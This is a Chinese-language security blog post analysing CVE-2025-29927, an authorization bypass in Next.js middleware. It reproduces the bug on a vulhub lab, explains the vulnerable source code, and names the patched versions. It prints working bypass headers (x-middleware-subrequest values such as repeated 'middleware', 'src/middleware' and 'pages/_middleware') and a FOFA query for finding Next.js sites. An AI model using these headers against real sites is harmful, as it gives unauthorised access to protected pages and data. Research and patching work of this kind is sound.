---
title: "next.js-中间件鉴权绕过漏洞"
date: "2025-04-10"
categories: 安全研究
tags:
- next.js-中间件鉴权绕过
- CVE-2025-29927
description: "CVE-2025-29927 的复现过程、执行逻辑与中间件鉴权机制分析。"
legacyPath: "/2025/04/10/next.js-中间件鉴权绕过漏洞/"
---

# Next.js 中间件鉴权绕过漏洞

## 漏洞基础原理

Next.js 是一个基于 React 的流行 Web 应用框架，提供服务器端渲染、静态网站生成和集成路由系统等功能。当使用中间件进行身份验证和授权时，Next.js 14.2.25 和 15.2.3 之前的版本存在授权绕过漏洞。

该漏洞允许攻击者通过操作 `x-middleware-subrequest` 请求头来绕过基于中间件的安全控制，从而可能获得对受保护资源和敏感数据的未授权访问。

## 受影响的版本

\>= 13.0.0，< 13.5.9 	

\>= 14.0.0，< 14.2.25

\>= 15.0.0，< 15.2.3

\>= 11.1.4，< 12.3.5

## 对应修补版本

13.5.9

14.2.25

15.2.3

12.3.5

## 漏洞利用

### fofa语法：

```cobol
app="next.js"
```

### 注意

需要找到一个目标需要凭证的页面或者目录，用于绕过

### 漏洞复现-利用

我们使用vulhub进行复现 一个基于 Next.js 15.2.2 的存在漏洞的应用

#### 1.打开网站后强制跳转到登录页面

![image-20250410083953320](/images/next.js/image-20250410083953320.png)

#### 2.现在进行绕过 我们访问3000端口进行抓包

在请求头添加 'x-middleware-subrequest' 值为: 'middleware:middleware:middleware:middleware:middleware'

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

或

```
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
```

![image-20250410084445621](/images/next.js/image-20250410084445621.png)

#### 进行对比，直接访问响应

![image-20250410084848558](/images/next.js/image-20250410084848558.png)

## 漏洞原理剖析

### 旧版本绕过-12.2之前

![image-20250410100131371](/images/next.js/image-20250410100131371.png)

```
// 从请求头中获取 'x-middleware-subrequest' 字段的值
// 该字段可能包含了需要跳过执行的中间件名称列表
const subreq = params.request.headers[`x-middleware-subrequest`];

// 判断 subreq 是否为字符串类型
// 如果是字符串，则按冒号 ':' 分割成数组；如果不是字符串，则将 subrequests 设为空数组
// 这样做是为了将可能存在的多个需要跳过的中间件名称解析出来
const subrequests = typeof subreq === 'string' ? subreq.split(':') : [];

// 创建一个新的 Headers 对象 allHeaders，用于存储所有中间件响应头信息
// 后续会将各个中间件的有效响应头合并到这个对象中
const allHeaders = new Headers();

// 初始化一个变量 result，用于存储中间件执行的结果
// 初始值设为 null，在后续中间件执行过程中会被赋值为具体的 FetchEventResult 对象
let result: FetchEventResult | null = null;

// 遍历中间件列表
// this.middleware 是当前服务器实例所配置的中间件数组
// 如果 this.middleware 为 null 或 undefined，则使用空数组替代
for (const middleware of this.middleware || []) {
    // 检查当前中间件是否匹配请求的路径
    // middleware.match 是一个函数，用于判断当前中间件是否应该处理该请求
    // params.parsedUrl.pathname 是解析后的请求路径
    if (middleware.match(params.parsedUrl.pathname)) {
        // 检查当前中间件对应的边缘函数是否存在
        // hasMiddleware 是一个异步函数，用于验证指定页面的中间件是否存在
        // middleware.page 是中间件对应的页面路径，middleware.ssr 表示是否为服务端渲染
        if (!(await this.hasMiddleware(middleware.page, middleware.ssr))) {
            // 如果中间件对应的边缘函数不存在，打印警告信息
            console.warn(`The Edge Function for ${middleware.page} was not found`);
            // 跳过当前中间件，继续处理下一个中间件
            continue;
        }

        // 确保中间件已准备好执行
        // ensureMiddleware 是一个异步函数，用于确保指定页面的中间件可以正常执行
        // 可能会涉及到加载中间件代码、初始化环境等操作
        await this.ensureMiddleware(middleware.page, middleware.ssr);

        // 获取当前中间件的详细信息
        // getMiddlewareInfo 是一个函数，根据传入的配置信息返回中间件的详细信息
        // 包括中间件的名称、路径、环境配置等
        const middlewareInfo = getMiddlewareInfo({
            dev: this.renderOpts.dev, // 是否为开发环境
            distDir: this.distDir, // 构建产物目录
            page: middleware.page, // 中间件对应的页面路径
            serverless: this._isLikeServerless, // 是否为无服务器环境
        });

        // 检查当前中间件的名称是否在需要跳过的中间件列表中
        // 如果在列表中，说明该中间件不需要执行
        if (subrequests.includes(middlewareInfo.name)) {
            // 创建一个默认的结果对象
            // response 使用 NextResponse.next() 表示继续执行后续操作，不做额外处理
            // waitUntil 是一个 Promise，这里使用 Promise.resolve() 表示立即完成
            result = {
                response: NextResponse.next(),
                waitUntil: Promise.resolve(),
            };
            // 跳过当前中间件，继续处理下一个中间件
            continue;
        }
```

`runMiddleware`函数

```
/**
 * 异步运行中间件的方法。
 * @param params - 包含运行中间件所需参数的对象。
 * @param params.request - 传入的 HTTP 请求对象。
 * @param params.response - 对应的 HTTP 响应对象。
 * @param params.parsedUrl - 解析后的 Next.js URL 对象。
 * @param params.parsed - 解析后的 URL 查询参数对象。
 * @param params.onWarning - 可选的警告处理函数，当出现警告时会被调用。
 * @returns 一个 Promise，解析为 FetchEventResult 或 null。
 */
protected async runMiddleware(params: {
    request: IncomingMessage;
    response: ServerResponse;
    parsedUrl: ParsedNextUrl;
    parsed: UrlWithParsedQuery;
    onWarning?: (warning: Error) => void;
}): Promise<FetchEventResult | null> {
    // 调用中间件的 Beta 版本警告函数，该函数使用 execOnce 确保只执行一次。
    // 此警告用于提醒开发者当前使用的是 Next.js 中间件的 Beta 版本，不保证遵循语义化版本控制。
    this.middlewareBetaWarning();

    // 初始化一个对象，用于存储当前匹配的页面信息，包括页面名称和参数
    const page: { name?: string; params?: { [key: string]: string } } = {};
    // 检查请求的路径是否对应一个存在的页面
    if (await this.hasPage(params.parsedUrl.pathname)) {
        // 如果存在，将该页面的名称赋值给 page 对象
        page.name = params.parsedUrl.pathname;
    } else if (this.dynamicRoutes) {
        // 如果请求的路径不是一个普通页面，检查动态路由
        for (const dynamicRoute of this.dynamicRoutes) {
            // 尝试匹配动态路由
            const matchParams = dynamicRoute.match(params.parsedUrl.pathname);
            if (matchParams) {
                // 如果匹配成功，将动态路由对应的页面名称和匹配参数赋值给 page 对象
                page.name = dynamicRoute.page;
                page.params = matchParams;
                break;
            }
        }
    }

    // 从请求头中获取 'x-middleware-subrequest' 字段的值
    const subreq = params.request.headers[`x-middleware-subrequest`];
    // 如果该字段存在且为字符串类型，则按冒号分割成数组，否则为空数组
    const subrequests = typeof subreq === 'string' ? subreq.split(':') : [];
    // 初始化一个 Headers 对象，用于合并所有中间件的响应头
    const allHeaders = new Headers();
    // 初始化结果变量，用于存储中间件运行的结果
    let result: FetchEventResult | null = null;

    // 遍历所有中间件
    for (const middleware of this.middleware || []) {
        // 检查当前中间件是否匹配请求的路径
        if (middleware.match(params.parsedUrl.pathname)) {
            // 检查当前中间件对应的边缘函数是否存在
            if (!(await this.hasMiddleware(middleware.page, middleware.ssr))) {
                // 如果不存在，输出警告信息并跳过该中间件
                console.warn(`The Edge Function for ${middleware.page} was not found`);
                continue;
            }

            // 确保中间件已经准备好可以运行
            await this.ensureMiddleware(middleware.page, middleware.ssr);

            // 获取当前中间件的信息
            const middlewareInfo = getMiddlewareInfo({
                dev: this.renderOpts.dev,
                distDir: this.distDir,
                page: middleware.page,
                serverless: this._isLikeServerless,
            });

            // 检查当前中间件是否在子请求列表中
            if (subrequests.includes(middlewareInfo.name)) {
                // 如果在，创建一个默认的响应结果并跳过该中间件的执行
                result = {
                    response: NextResponse.next(),
                    waitUntil: Promise.resolve(),
                };
                continue;
            }

            // 运行当前中间件
            result = await run({
                name: middlewareInfo.name,
                paths: middlewareInfo.paths,
                request: {
                    headers: params.request.headers,
                    method: params.request.method || 'GET',
                    nextConfig: {
                        basePath: this.nextConfig.basePath,
                        i18n: this.nextConfig.i18n,
                        trailingSlash: this.nextConfig.trailingSlash,
                    },
                    url: getRequestMeta(params.request, '__NEXT_INIT_URL')!,
                    page: page,
                },
                useCache: !this.nextConfig.experimental.concurrentFeatures,
                onWarning: (warning: Error) => {
                    if (params.onWarning) {
                        // 如果有警告处理函数，添加中间件名称到警告信息中并调用该函数
                        warning.message += ` "./${middlewareInfo.name}"`;
                        params.onWarning(warning);
                    }
                },
            });

            // 遍历中间件响应的所有头部信息
            for (let [key, value] of result.response.headers) {
                // 排除 'x-middleware-next' 头部，将其他头部信息添加到 allHeaders 中
                if (key!== 'x-middleware-next') {
                    allHeaders.append(key, value);
                }
            }

            if (!this.renderOpts.dev) {
                // 在非开发环境下，捕获中间件异步操作的错误并输出错误信息
                result.waitUntil.catch((error) => {
                    console.error(`Uncaught: middleware waitUntil errored`, error);
                });
            }

            // 检查中间件响应头中是否包含 'x-middleware-next'
            if (!result.response.headers.has('x-middleware-next')) {
                // 如果不包含，说明不需要继续执行后续中间件，跳出循环
                break;
            }
        }
    }

    // 如果没有任何中间件产生结果
    if (!result) {
        // 渲染 404 页面
        this.render404(params.request, params.response, params.parsed);
    } else {
        // 将合并后的头部信息设置到最终结果的响应头中
        for (let [key, value] of allHeaders) {
            result.response.headers.set(key, value);
        }
    }

    // 返回最终的中间件运行结果
    return result;
}
```

该框架的旧版本（v12.0.7）存在一段代码

1.当 next.js 应用程序使用中间件时，将使用runMiddleware函数
2.runMiddleware函数会检索x-middleware-subrequest头的Value
	使用Value来判断是否需要应用中间件

1.具体而言：x-middleware-subrequest头的Value被拆分并使用:作为分隔符创建一个列表
2.检查此列表是否包含middlewareInfo.name值
3.这意味着，如果我们将有正确Value的x-middleware-subrequest头添加到请求中，中间件将被完全忽略，并且请求将通过转发NextResponse.next()并成功访问路径，而中间件不会对其产生任何影响。

为了成功未授权访问，x-middleware-subrequest的Value必须包含middlewareInfo.name



#### 1.middlewareInfo.name

middlewareInfo.name的值完全可以猜测，它只是中间件所在的路径。要知道这一点，有必要快速了解一下旧版本中中间件的配置方式。

首先，在版本 12.2之前，该文件必须命名为 _middleware.ts。

此外，approuter 仅在 Next.js 版本 13 中发布。此前唯一存在的 router 就是 pages router ，因此该文件必须放在pages文件夹中（router specific）。

这些信息使我们能够推断出中间件的确切路径，从而猜测出x-middleware-subrequest头的值，后者仅由目录名称和文件名称组成，遵循当时的约定，以下划线开头：

```
x-middleware-subrequest: pages/_middleware
```

这样便可以完全绕过中间件，从而绕过任何基于它的保护系统

但还需要考虑执行顺序问题

#### 2.执行顺序

12.2 之前的版本允许嵌套路由将一个或多个`_middleware`文件放置在树中的任何位置（从`pages`文件夹开始），并且具有执行顺序

![img](/images/next.js/9a2d3e47f55c82a44d04345781818f58.png)

因此，要获得对`/dashboard/panel/admin`（受中间件保护的）的访问权限，关于`middlewareInfo.name`的值有三种可能性，因此 `x-middleware-subrequest` 的值也有三种可能性：

```
pages/_middleware

pages/dashboard/_middleware

pages/dashboard/panel/_middleware
```

### 新版本代码 - 12.2之后

从版本 12.2 开始，该文件不再包含下划线，而必须简单地命名为`middleware.ts`

此外，它不能再位于 `pages` 文件夹中

1.有效Payload：

```
x-middleware-subrequest: middleware
```

2./src 目录

还应该考虑到 Next.js 提供了创建`/src`目录的可能性

除了在项目根目录中放置特殊的 Next.js 应用程序或页面目录外，Next.js 还支持将应用程序代码放置在 src 目录下的常见模式。[Next.js文档](https://nextjs.org/docs/app/building-your-application/configuring/src-directory)

在这种情况下，有效Payload将是：

```
x-middleware-subrequest: src/middleware
```

因此，无论路径有多少层，总共只有两种可能性

#### 新版本逻辑变动代码

![image-20250410102039484](/images/next.js/image-20250410102039484.png)

```
/**
 * 导出一个异步函数 `run`，它使用 `withTaggedErrors` 包装，目的是为错误添加标签以便于调试和追踪。
 * @param params - 运行中间件所需的参数对象。
 * @returns 一个 Promise，解析为中间件运行的结果。
 */
export const run = withTaggedErrors(async function runWithTaggedErrors(params) {
    // 调用 `getRuntimeContext` 函数获取运行时上下文，该上下文包含了中间件运行所需的环境信息等。
    // 此操作是异步的，会等待结果返回后再继续执行后续代码。
    const runtime = await getRuntimeContext(params);

    // 从请求头中获取 `x-middleware-subrequest` 字段的值。
    // 这个字段可能包含了需要跳过执行的中间件名称列表，也可能用于记录递归调用的中间件信息。
    const subreq = params.request.headers[`x-middleware-subrequest`];

    // 判断 `subreq` 是否为字符串类型。
    // 如果是字符串，则按冒号 `:` 分割成数组；如果不是字符串，则将 `subrequests` 设为空数组。
    // 这样做是为了将可能存在的多个中间件名称解析出来。
    const subrequests = typeof subreq === 'string' ? subreq.split(':') : [];

    // 定义最大递归深度，用于限制中间件递归调用的次数，避免无限递归导致栈溢出。
    const MAX_RECURSION_DEPTH = 5;

    // 计算当前中间件在 `subrequests` 数组中出现的次数，即递归调用的深度。
    // `reduce` 方法会遍历 `subrequests` 数组，对于每个元素，如果其等于当前中间件的名称 `params.name`，则累加器 `acc` 加 1。
    const depth = subrequests.reduce(
        (acc, curr) => (curr === params.name ? acc + 1 : acc),
        0
    );
});
```

常量depth的值必须大于或等于常量MAX_RECURSION_DEPTH的值 （即5）

每当subrequests（即用:分隔的Value的列表）中的其中一个Value等于中间件路径即params.name时，常量depth就会加 1

而params.name跟之前一样，只有两种可能性：middleware/src/middleware

因此，我们只需要在请求中添加以下标头/值即可绕过中间件：



```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

或

```
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
```

payload解释：这是[为了防止递归请求](https://nextjs.org/blog/cve-2025-29927)陷入无限循环。

## 漏洞修复

升级到不受影响版本

## 参考链接

[Next.js 中间件鉴权绕过漏洞 (CVE-2025-29927) 复现利用与原理分析_cve-2025-29927复现-CSDN博客](https://blog.csdn.net/Dalock/article/details/146492231)

[vercel/next.js: The React Framework](https://github.com/vercel/next.js)
